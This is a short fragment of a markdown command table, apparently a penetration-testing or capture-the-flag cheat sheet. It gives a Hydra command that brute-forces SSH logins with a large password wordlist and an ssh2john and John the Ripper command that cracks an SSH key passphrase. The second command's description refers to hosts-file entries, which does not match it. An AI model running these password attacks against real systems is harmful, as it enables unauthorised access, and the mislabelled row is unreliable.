...
| `hydra -l john -P /home/Seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt 10.49.130.158 ssh` | Hydra Password Cracking |
| `ssh2john key keyhash && john --wordlist=/path/to/wordlist keyhash` | View your current hosts file entries |
---
